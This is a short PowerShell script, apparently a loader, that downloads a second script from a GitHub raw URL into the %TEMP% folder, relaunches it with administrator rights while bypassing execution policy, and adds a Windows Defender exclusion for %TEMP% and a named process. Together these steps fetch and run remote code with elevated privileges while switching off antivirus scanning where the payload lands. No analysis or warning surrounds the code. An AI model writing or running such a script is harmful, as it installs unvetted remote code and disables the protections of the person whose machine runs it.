# # FIRST THINGS FIRST



# Define the URL of the file to download
$url = "https://raw.githubusercontent.com/joel2128/bott/refs/heads/main/ftf.ps1"

# Define the destination path in the %TEMP% directory
$destination = "$env:TEMP\ftf.ps1"

# Use Invoke-WebRequest to download the file
Invoke-WebRequest -Uri $url -OutFile $destination

# Output the path to confirm where the file was saved
Write-Output "File downloaded to: $destination"



# Check if the script is running with elevated privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Define the path to %TEMP%\ftf.ps1
    $scriptPath = "$env:TEMP\ftf.ps1"

    # Relaunch the script with elevated privileges
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}


# Set the execution policy
Set-ExecutionPolicy RemoteSigned -Force

# Add Exlusion in Windows Defender
Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"